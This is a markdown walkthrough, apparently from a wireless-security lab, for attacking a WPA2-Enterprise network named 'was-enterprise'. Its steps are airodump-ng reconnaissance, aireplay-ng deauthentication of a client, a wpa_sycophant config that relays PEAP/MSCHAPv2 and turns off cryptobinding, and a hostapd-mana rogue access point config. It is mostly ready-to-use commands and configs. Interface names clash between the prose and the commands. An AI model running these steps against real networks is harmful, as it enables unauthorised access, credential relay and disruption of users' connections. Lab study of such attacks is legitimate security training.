# Eap network

This network is vulnerable to heeeaps of attacks!

WITH the wpa_sycophant attack you'll need to run wpa_sycophant before hostapd-mana (I think, it just works this way so idk). Also you'll have to compile wpa_sycophant yourself as the one in the kali repos doesn't work!

## Tools

- [airmon-ng](https://linux.die.net/man/1/airmon-ng)
- [airodump-ng](https://linux.die.net/man/1/airodump-ng)
- [wpa_supplicant](https://linux.die.net/man/8/wpa_supplicant)
- [hostapd-mana]
- [wpa_sycophant]

## Reconnaissance

1. Set the `wlan2` interface into monitor mode

```bash
sudo airmon-ng start wlan0
```

> Note: Do not run `airmon-ng check kill` as it will kill important processes required to run was

2. Conduct reconnaissance using the `wlan2mon` interface to find the target open network

```bash
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```

Here is a breakdown of the above command
```bash
sudo               # Run the command as `root`
  airodump-ng      # The program we want to run
    wlan2mon       # The wireless interface
    --band abg     # Hop to channels in the a, b, and g frequency bands
    --wps          # List Wireless Protected Setup (WPS) information
    --manufacturer # Display the manufacturer of devices (based on their OUI)
```

3. Focus in on the target network to gather more information

Make sure you note down:
- The bssid
- The mac address of the target client

```bash
sudo airodump-ng wlan0mon -c 11
```

While you're doing this, open wireshark and deauth the client to capture the certificate to mimic:

```bash
sudo aireplay-ng -0 0 -a <ap bssid> -c <client mac> wlan0mon
```

3. Setup and run wpa_sycophant

```bash
sudo wpa_sycophant -i wlan1 -c sycophant.conf
```

sycophant.conf
```conf
network={
  # The SSID you would like to relay and authenticate against. 
  ssid="was-enterprise"
  scan_ssid=1
  key_mgmt=WPA-EAP
  # Do not modify
  identity=""
  anonymous_identity=""
  password=""
  # This initialises the variables for me.
  # -------------
  eap=PEAP
  # Read https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf for help with phase1 options. 
  # This attempts to force the client not use cryptobinding. 
  phase1="crypto_binding=0 peapver=0"
  phase2="auth=MSCHAPV2"
  # Dont want to connect back to ourselves,
  # so add your rogue BSSID here.
  bssid_blacklist=aa:bb:cc:dd:ee:ff
}
```

4. Setup and run hostapd-mana the same way that you would a normal wpa-eap rogue ap, but enable the `enable_sycophant` and `sycophant_dir` options

```bash
sudo hostapd-mana hostapd-mana.conf
```

hostapd.eap_user
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

hostapd-mana.conf
```bash
interface=wlan0
ssid=was-enterprise
channel=11

hw_mode=g

# WPA2 PSK with CCMP
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP

macaddr_acl=0 
auth_algs=1
own_ip_addr=127.0.0.1
ieee8021x=1
eap_server=1
eapol_version=1

# Replace these certs with your own generated ones. Use eap_ap.sh in adhoc/ to generate certs for you.
eap_user_file=./hostapd.eap_user
ca_cert=/etc/hostapd-mana/certs/ca.pem
server_cert=/etc/hostapd-mana/certs/server.pem
private_key=/etc/hostapd-mana/certs/server.key
private_key_passwd=whatever

mana_wpe=1
mana_eapsuccess=1
mana_eaptls=1
ieee80211n=1

# Enable wpa_sycophant
enable_sycophant=1
sycophant_dir=/tmp/
```

5. Deauth the client you want to connect to your rogue AP

```bash
sudo aireplay-ng -0 0 -a <ap bssid> -c <client mac> wlan0mon
```
